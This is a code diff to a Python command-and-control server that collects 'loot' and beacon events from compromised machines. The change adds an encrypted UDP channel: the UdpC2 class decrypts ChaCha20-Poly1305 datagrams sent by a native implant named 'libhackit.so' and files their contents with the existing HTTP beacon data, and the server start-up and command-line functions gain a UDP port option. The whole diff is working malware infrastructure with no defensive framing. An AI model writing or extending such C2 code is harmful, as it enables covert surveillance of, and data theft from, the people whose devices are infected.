@@ -27,6 +27,7 @@ from dataclasses import dataclass, field
 from typing import Any, Dict, Optional
 
 from aiohttp import web
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 
 from . import ios as WEBAGENT
 from . import webagent
@@ -42,6 +43,7 @@ class Hub:
     token: str
     public_url: str
     web_token: str = ""
+    udp_port: int = 0
     max_tasks: int = 8
     stale_after: int = 180
     offline_after: int = 300
@@ -157,6 +159,71 @@ def _ingest_loot(sid: str, body: Dict[str, Any]) -> None:
             continue
         store.add_loot(sid, str(item.get("name") or os.path.basename(path)), path,
                        int(item.get("size") or 0), str(item.get("kind") or "file"))
+
+
+def udp_key(psk: bytes) -> bytes:
+    return protocol.hkdf(psk, b"chacha20-poly1305")
+
+
+def udp_ingest(hub: Hub, sid: str, body: dict, peer: str) -> None:
+    """Native datagrams land in the same store as HTTP beacons."""
+    op = str(body.get("op") or "event")[:16]
+    meta = body.get("meta") if isinstance(body.get("meta"), dict) else {}
+    store.register(sid, meta, peer, kind="native")
+    store.touch(sid, meta, op, peer)
+    if op == "probe" or "data" in body and op != "event":
+        store.add_event(sid, "probe", body.get("data") or body)
+        return
+    events = body.get("events")
+    if isinstance(events, list):
+        for event in events[:200]:
+            if isinstance(event, dict):
+                store.add_event(sid, str(event.get("kind") or "native")[:32], event.get("data"))
+    else:
+        store.add_event(sid, "native", body)
+
+
+class UdpC2(asyncio.DatagramProtocol):
+    """Sealed datagrams from libhackit.so, decrypted with the same PSK."""
+
+    def __init__(self, hub: Hub, psk: bytes) -> None:
+        self.hub = hub
+        self.aead = ChaCha20Poly1305(udp_key(psk))
+        self.transport: asyncio.DatagramTransport | None = None
+
+    def connection_made(self, transport: asyncio.BaseTransport) -> None:
+        self.transport = transport  # type: ignore[assignment]
+
+    def datagram_received(self, data: bytes, addr) -> None:
+        if len(data) < 21 or data[:4] != b"HK1\x00":
+            return
+        if len(data) > 2048:
+            return
+        header, nonce, cipher = data[:21], data[9:21], data[21:]
+        try:
+            plain = self.aead.decrypt(nonce, cipher, header)
+            body = json.loads(plain.decode("utf-8"))
+        except Exception:
+            return
+        if not isinstance(body, dict):
+            return
+        sid = str(body.get("sid") or "")[:64]
+        if not sid:
+            sid = f"native-{addr[0].replace('.', '-')}-{addr[1]}"
+        try:
+            udp_ingest(self.hub, sid, body, f"{addr[0]}:{addr[1]}")
+        except Exception:
+            return
+
+    def error_received(self, exc: Exception) -> None:
+        _ = exc
+
+
+async def start_udp(hub: Hub, psk: bytes) -> None:
+    if not hub.udp_port:
+        return
+    loop = asyncio.get_running_loop()
+    await loop.create_datagram_endpoint(lambda: UdpC2(hub, psk), local_addr=("0.0.0.0", hub.udp_port))
 
 
 async def beacon(request: web.Request) -> web.Response:
@@ -522,6 +589,7 @@ def make_app(hub: Hub) -> web.Application:
     store.init()
     app = web.Application(client_max_size=protocol.MAX_BODY)
     app["hub"] = hub
+    app["psk"] = hub.psk
     app.add_routes(
         [
             web.post("/v1/beacon", beacon),
@@ -543,6 +611,8 @@ def make_app(hub: Hub) -> web.Application:
 
     async def on_start(app: web.Application) -> None:
         app["housekeeper"] = asyncio.create_task(_housekeeping(app, hub))
+        if hub.udp_port:
+            await start_udp(hub, hub.psk)
 
     async def on_stop(app: web.Application) -> None:
         task = app["housekeeper"]
@@ -582,16 +652,18 @@ def write_psk(path: str) -> bytes:
     return key
 
 
-async def serve(host: str, port: int, psk_path: str, token: Optional[str], public_url: str) -> None:
+async def serve(host: str, port: int, psk_path: str, token: Optional[str], public_url: str,
+                udp_port: int = 0) -> None:
     psk = load_psk(psk_path) if os.path.exists(psk_path) else write_psk(psk_path)
     token = token or secrets.token_urlsafe(24)
-    hub = Hub(psk=psk, token=token, public_url=public_url, web_token=secrets.token_urlsafe(9))
+    hub = Hub(psk=psk, token=token, public_url=public_url,
+              web_token=secrets.token_urlsafe(9), udp_port=udp_port)
     app = make_app(hub)
     runner = web.AppRunner(app, access_log=None)
     await runner.setup()
     site = web.TCPSite(runner, host, port)
     await site.start()
-    print(f"  listen      {host}:{port}")
+    print(f"  listen      {host}:{port}" + (f"  udp {udp_port}" if udp_port else ""))
     print(f"  public url  {public_url}")
     print(f"  token       {token}")
     print(f"  psk         {psk_path}")
@@ -599,5 +671,6 @@ async def serve(host: str, port: int, psk_path: str, token: Optional[str], publi
     await asyncio.Event().wait()
 
 
-def run(host: str, port: int, psk_path: str, token: Optional[str], public_url: str) -> None:
-    asyncio.run(serve(host, port, psk_path, token, public_url))
+def run(host: str, port: int, psk_path: str, token: Optional[str], public_url: str,
+        udp_port: int = 0) -> None:
+    asyncio.run(serve(host, port, psk_path, token, public_url, udp_port))
